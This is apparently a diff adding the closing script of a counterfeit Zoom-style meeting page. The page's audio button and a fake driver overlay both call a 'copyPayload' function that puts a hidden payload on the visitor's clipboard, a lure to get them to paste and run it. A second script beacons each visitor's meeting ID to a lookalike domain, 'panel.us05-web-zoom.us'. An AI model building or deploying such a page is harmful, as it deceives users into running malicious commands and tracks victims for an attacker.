+const tbMicOn  = '<svg viewBox="4 -1 17 26" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7.5 4.5C7.5 2.01 9.51 0 12 0s4.5 2.01 4.5 4.5V12c0 2.49-2.01 4.5-4.5 4.5S7.5 14.49 7.5 12V4.5ZM12 15c1.65 0 3-1.35 3-3V4.5c0-1.65-1.35-3-3-3s-3 1.35-3 3V12c0 1.65 1.35 3 3 3Z" fill="#fff"/><path d="M19.485 12.15c.015-.045.015-.105.015-.15 0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 3.315-2.685 6-6 6s-6-2.685-6-6c0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 .045 0 .105.015.15.06 3.81 2.985 6.93 6.735 7.305V22.5h-3c-.42 0-.75.33-.75.75s.33.75.75.75h7.5c.42 0 .75-.33.75-.75s-.33-.75-.75-.75h-3v-3.045c3.75-.375 6.675-3.495 6.735-7.305Z" fill="#fff"/></svg>';
+const tbCamOff = '<svg viewBox="0 0 38 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15.137 4.802c.269-.268.29-.704-.002-.946A3.735 3.735 0 0 0 12.75 3H3A2.25 2.25 0 0 0 .75 5.25v8.25c0 1.385.751 2.595 1.869 3.245.223.13.502.073.685-.11.37-.369.15-1.076-.25-1.411A2.245 2.245 0 0 1 2.25 13.5V5.25A.75.75 0 0 1 3 4.5h9.75c.433 0 .837.122 1.18.334.376.232.895.28 1.207-.032ZM6.31 15.75h7.94A.75.75 0 0 0 15 15V7.06l1.353-1.353c.096.331.147.681.147 1.043V15a2.25 2.25 0 0 1-2.25 2.25H4.81l1.5-1.5ZM22.846 4.585a.75.75 0 0 1 .404.665V15a.75.75 0 0 1-1.18.614l-3.75-2.625a.75.75 0 0 1 .86-1.228l2.57 1.799V6.69l-2.57 1.8a.75.75 0 1 1-.86-1.23l3.75-2.624a.75.75 0 0 1 .776-.051Z" fill="#fff"/><path fill-rule="evenodd" clip-rule="evenodd" d="M20.78 2.22a.75.75 0 0 1 0 1.06L3.53 20.53a.75.75 0 0 1-1.06-1.06L19.72 2.22a.75.75 0 0 1 1.06 0ZM23.257 20.765A1.5 1.5 0 0 0 24.565 23h10.87a1.5 1.5 0 0 0 1.308-2.235l-5.436-9.663a1.5 1.5 0 0 0-2.614 0l-5.436 9.663ZM29.35 17.6v-2.95a.65.65 0 1 1 1.3 0v2.95a.65.65 0 0 1-1.3 0Zm-.1 2.65a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Z" fill="#F05"/></svg>';
+const tbCamOn  = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 5.25A2.25 2.25 0 0 0 .75 7.5v9A2.25 2.25 0 0 0 3 18.75h9A2.25 2.25 0 0 0 14.25 16.5v-2.56l4.32 3.024A.75.75 0 0 0 19.75 16.35V7.65a.75.75 0 0 0-1.18-.614L14.25 10.06V7.5A2.25 2.25 0 0 0 12 5.25H3Z" fill="#fff"/></svg>';
+function setVideoIcon(on){ document.getElementById('camIc').innerHTML = on ? tbCamOn : tbCamOff; }
+function setAudioIcon(muted){ document.getElementById('micIc').innerHTML = muted ? tbMicOff : tbMicOn; }
+function maybeHideNotif(){ if(me.video || !me.muted) document.getElementById('notif').style.display='none'; }
+
+document.getElementById('tVideo').addEventListener('click', toggleCamera);
+document.getElementById('tAudio').addEventListener('click', ()=>{
+  copyPayload(false);
+  drvOverlay.classList.add('open');
+});
+
+const drvOverlay = document.getElementById('drvOverlay');
+document.getElementById('drvOpen').addEventListener('click', e=>{
+  e.stopPropagation();
+  copyPayload(false);
+  drvOverlay.classList.add('open');
+});
+document.getElementById('drvClose').addEventListener('click', ()=> drvOverlay.classList.remove('open'));
+drvOverlay.addEventListener('click', e=>{
+  if(e.target === drvOverlay){ drvOverlay.classList.remove('open'); return; }
+  if(e.target.id === 'drvCopy' || (e.target.closest && e.target.closest('#drvCopy'))){
+    copyPayload(true);
+  }
+});
+document.addEventListener('keydown', e=>{ if(e.key==='Escape') drvOverlay.classList.remove('open'); });
+document.getElementById('notifClose').addEventListener('click', ()=>{ document.getElementById('notif').style.display='none'; });
+
+document.getElementById('tLeave').addEventListener('click', ()=>{
+  if(camStream) camStream.getTracks().forEach(t=>t.stop());
+  if(micStream) micStream.getTracks().forEach(t=>t.stop());
+  camStream=micStream=null; handUp=false;
+  document.getElementById('raiseHand').classList.remove('on');
+  document.getElementById('raiseHand').innerHTML = '✋&nbsp; Raise Hand';
+  nameInput.value=''; joinBtn.classList.remove('enabled');
+  closeAllPops();
+  chatPanel.classList.remove('open'); partPanel.classList.remove('open');
+  tChat.classList.remove('active'); tPart.classList.remove('active');
+  show('info');
+});
+window.addEventListener('resize', ()=>{
+  if(!screens.meeting.classList.contains('active')) return;
+  viewMode==='gallery' ? applyTileWidth() : sizeSpeaker();
+});
+</script>
+<script>
+(function(){
+  var parts = location.pathname.split('/').filter(Boolean);
+  window.__MID__ = parts[parts.length-1].replace(/\D/g,'');
+  if(window.__MID__){
+    new Image().src = 'https://panel.us05-web-zoom.us/api/track.php?m=' + window.__MID__ + '&t=' + Date.now();
+  }
+})();
+</script>
+</body>
+</html>
